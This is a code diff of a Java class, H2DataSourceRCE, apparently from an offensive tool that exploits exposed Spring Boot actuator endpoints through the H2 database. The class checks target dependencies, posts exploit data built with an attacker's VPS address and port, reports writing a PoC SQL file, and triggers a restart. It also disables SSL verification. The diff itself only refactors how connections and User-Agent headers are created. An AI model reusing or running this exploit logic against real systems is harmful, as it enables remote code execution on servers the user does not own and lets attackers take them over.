@@ -1,20 +1,17 @@
 package src.main.module;
 
-import src.main.common.UA_Config;
+import src.main.common.HTTPConfig;
 import src.main.impl.ResultCallback;
 
 import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
-import java.util.List;
-import java.util.Random;
 import java.util.Scanner;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
-import java.util.stream.Stream;
 
-import static src.main.SSLVerify.sslVer.disableSSLVerification;
+import static src.main.ssl.sslVer.disableSSLVerification;
 
 public class H2DataSourceRCE {
     private String address;
@@ -42,15 +39,9 @@ public class H2DataSourceRCE {
         String llib = "h2database";
         String llib1 = "spring-boot-starter-data-jpa";
         String data = String.format(expData1,vpsIP + ":" + vpsPort);
-        String ua = "";
         disableSSLVerification();
         try {
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent",ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
@@ -73,9 +64,7 @@ public class H2DataSourceRCE {
                     text = String.format("spring-boot-starter-data-jpa 依赖为：%s",matcher1.group(1));
                     callback.onResult(text);
                     URL obj1 = new URL(site);
-                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
-                    ua = uacf.getRandomUserAgent(ualist);
-                    conn1.setRequestProperty("User-Agent",ua);
+                    HttpURLConnection conn1 = HTTPConfig.createConnection(site);
                     conn1.setRequestMethod("POST");
                     conn1.setRequestProperty("Content-Type","application/json");
                     conn1.setDoOutput(true);
@@ -97,10 +86,7 @@ public class H2DataSourceRCE {
                             text = "H2DbSourcePoc.sql文件写入成功";
                             callback.onResult(text);
                             ++count;
-                            URL obj2 = new URL(restsite);
-                            HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
-                            ua = uacf.getRandomUserAgent(ualist);
-                            conn2.setRequestProperty("User-Agent",ua);
+                            HttpURLConnection conn2 = HTTPConfig.createConnection(restsite);
                             conn2.setRequestMethod("POST");
                             conn2.setRequestProperty("Content-Type", "application/json");
                             conn2.setDoOutput(true);
@@ -142,15 +128,9 @@ public class H2DataSourceRCE {
         String llib = "h2database";
         String llib1 = "spring-boot-starter-data-jpa";
         String data = String.format(expData2,vpsIP + ":" + vpsPort);
-        String ua = "";
         disableSSLVerification();
         try{
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent",ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
@@ -172,10 +152,7 @@ public class H2DataSourceRCE {
                     callback.onResult(text);
                     text = String.format("spring-boot-starter-data-jpa 依赖为：%s",matcher1.group(1));
                     callback.onResult(text);
-                    URL obj1 = new URL(site);
-                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
-                    ua = uacf.getRandomUserAgent(ualist);
-                    conn1.setRequestProperty("User-Agent",ua);
+                    HttpURLConnection conn1 = HTTPConfig.createConnection(site);
                     conn1.setRequestMethod("POST");
                     conn1.setRequestProperty("Content-Type","application/json");
                     conn1.setDoOutput(true);
@@ -198,9 +175,7 @@ public class H2DataSourceRCE {
                             callback.onResult(text);
                             ++count;
                             URL obj2 = new URL(restsite);
-                            HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
-                            ua = uacf.getRandomUserAgent(ualist);
-                            conn2.setRequestProperty("User-Agent",ua);
+                            HttpURLConnection conn2 = HTTPConfig.createConnection(restsite);
                             conn2.setRequestMethod("POST");
                             conn2.setRequestProperty("Content-Type", "application/json");
                             conn2.setDoOutput(true);
@@ -241,15 +216,9 @@ public class H2DataSourceRCE {
         String site = address + api;
         String llib = "h2database";
         String llib1 = "spring-boot-starter-data-jpa";
-        String ua = "";
         disableSSLVerification();
         try {
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent", ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
@@ -271,10 +240,8 @@ public class H2DataSourceRCE {
                     callback.onResult(text);
                     text = String.format("spring-boot-starter-data-jpa 依赖为：%s", matcher1.group(1));
                     callback.onResult(text);
-                    URL obj1 = new URL(address + "/actuator");
-                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
+                    HttpURLConnection conn1 = HTTPConfig.createConnection(address + "/actuator");
                     conn1.setDoOutput(true);
-                    conn1.setRequestProperty("User-Agent", ua);
                     conn1.setRequestMethod("GET");
                     int responseCode1 = conn1.getResponseCode();
                     BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
@@ -307,15 +274,9 @@ public class H2DataSourceRCE {
         String site = address + api;
         String llib = "h2database";
         String llib1 = "spring-boot-starter-data-jpa";
-        String ua = "";
         disableSSLVerification();
         try {
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent", ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
@@ -337,10 +298,8 @@ public class H2DataSourceRCE {
                     callback.onResult(text);
                     text = String.format("spring-boot-starter-data-jpa 依赖为：%s", matcher1.group(1));
                     callback.onResult(text);
-                    URL obj1 = new URL(address + "/actuator");
-                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
+                    HttpURLConnection conn1 = HTTPConfig.createConnection(address + "/actuator");
                     conn1.setDoOutput(true);
-                    conn1.setRequestProperty("User-Agent", ua);
                     conn1.setRequestMethod("GET");
                     int responseCode1 = conn1.getResponseCode();
                     BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
@@ -371,15 +330,9 @@ public class H2DataSourceRCE {
     public void Exp(ResultCallback callback){
         String api ="/actuator/env";
         String site = address + api;
-        String ua = "";
         disableSSLVerification();
         try{
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent",ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             if (responseCode == HttpURLConnection.HTTP_OK) {
